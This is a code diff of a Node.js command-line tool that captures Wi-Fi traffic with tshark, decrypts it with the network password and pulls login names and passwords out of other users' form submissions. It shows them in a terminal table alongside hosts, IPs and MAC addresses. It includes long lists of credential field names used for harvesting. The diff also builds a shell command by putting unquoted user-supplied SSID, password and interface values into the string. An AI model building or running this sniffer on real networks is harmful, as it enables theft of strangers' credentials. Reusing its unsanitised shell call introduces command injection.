@@ -9,29 +9,56 @@ const getProp = require('get-prop')
 const JSONStream = require('JSONStream')
 const blessed = require('blessed')
 const contrib = require('blessed-contrib')
-
-
 const {exec}= require('shelljs')
+const meow = require('meow')
 
-const ssid = process.env.WOS_SSID
-const pass = process.env.WOS_PASS
+const cli = meow(`
+    Usage
+      $ wos <options>
 
-const child = exec(`WOS_PASS="${pass}"; WOS_SSID="${ssid}"; source ./tshark.sh`, {async:true})
+    Important
+      Use single quotes in order to escape special characters.
 
-/*
-child.stdout.on('data', function(data) {
-  console.log(data)
-})
-*/
+    Options
+      -i, --interface Capture interface
+      -s, --ssid Wifi SSID
+      -p, --pass Wifi password
+      -nm, --no-monitor Disable monitor mode
 
-//process.stdin.pipe(JSONStream.parse('*._source.layers'))
-child.stdout.pipe(JSONStream.parse('*._source.layers'))
-.on('data', processLine)
+    Examples
+      $ wos -i en0 --ssid='HomeWifi' --pass='d4Pazsw0rD'
+`)
+
+const {flags} = cli
+
+const ssid = process.env.WOS_SSID || flags.ssid || flags.s
+const pass = process.env.WOS_PASS || flags.pass || flags.p
+const interface = process.env.WOS_INTERFACE || flags.interface || flags.i
+
+let screen = null
+let table = null
+const tableHeaders = ['login', 'pass', 'port', 'host', 'dst_ip', 'ip', 'mac']
+const tableData = []
+
+const userFields = [
+  'log', 'login', 'wpname', 'name', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name', 'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname', 'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename', 'uname', 'ulogin', 'acct', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username', 'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'sign_in', 'identification', 'os_username', 'txtAccount', 'loginAccount', 'username', 'user_email', 'useremail', 'account_id', 'customer', 'customer_id', 'identifier', 'session[username_or_email]', 'user[email]', 'signin-form[login]', '_username', 'identity', 'sUsername', 'login[username]', 'onlineId', 'onlineId1', 'online_id', 'userId', 'j_username', 'userid', 'AccessIDVisible', 'accessId', 'accessid', 'access_id'
+]
+
+const passFields = [
+  'os_password', 'txtPwd', 'loginPasswd', 'ahd_password', 'pass', 'password', '_password', 'passwd', 'passwrd', 'session_password', 'sessionpassword', 'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password', 'passwort', 'wppassword', 'upasswd', 'password', 'user_pass', 'secret', 'session[password]', 'user[password]', 'signin-form[password]', '_password', 'sPassword', 'login[password]', 'passcode', 'passcode1', 'j_password'
+]
+
+if (interface) {
+  main()
+} else {
+  return false
+}
 
 
-const screen = blessed.screen()
+function main() {
+screen = blessed.screen()
 
-const table = contrib.table({
+table = contrib.table({
   keys: true,
   fg: 'white',
   selectedFg: 'white',
@@ -50,9 +77,6 @@ const table = contrib.table({
 
 table.focus()
 
-const tableHeaders = ['login', 'pass', 'port', 'host', 'dst_ip', 'ip', 'mac']
-const tableData = []
-
 table.setData({
   headers: tableHeaders,
   data: tableData
@@ -61,13 +85,14 @@ table.setData({
 screen.append(table)
 screen.render()
 
-const userFields = [
-  'log', 'login', 'wpname', 'name', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name', 'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname', 'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename', 'uname', 'ulogin', 'acct', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username', 'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'sign_in', 'identification', 'os_username', 'txtAccount', 'loginAccount', 'username', 'user_email', 'useremail', 'account_id', 'customer', 'customer_id', 'identifier', 'session[username_or_email]', 'user[email]', 'signin-form[login]', '_username', 'identity', 'sUsername', 'login[username]', 'onlineId', 'onlineId1', 'online_id', 'userId', 'j_username', 'userid', 'AccessIDVisible', 'accessId', 'accessid', 'access_id'
-]
+  const child = exec(`source ./tshark.sh ${interface} ${ssid} ${pass}`, {async: true, silent: true})
 
-const passFields = [
-  'os_password', 'txtPwd', 'loginPasswd', 'ahd_password', 'pass', 'password', '_password', 'passwd', 'passwrd', 'session_password', 'sessionpassword', 'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password', 'passwort', 'wppassword', 'upasswd', 'password', 'user_pass', 'secret', 'session[password]', 'user[password]', 'signin-form[password]', '_password', 'sPassword', 'login[password]', 'passcode', 'passcode1', 'j_password'
-]
+  //process.stdin.pipe(JSONStream.parse('*._source.layers'))
+  child.stdout.pipe(JSONStream.parse('*._source.layers'))
+  .on('data', processLine)
+
+}
+
 
 function processLine (layers) {
   const get = getProp(layers)
@@ -134,6 +159,7 @@ function processLine (layers) {
 
     if (account || password) {
       const row = [account, password, port, host, dstip, srcip, srcmac]
+
       tableData.unshift(row)
 
       table.setData({
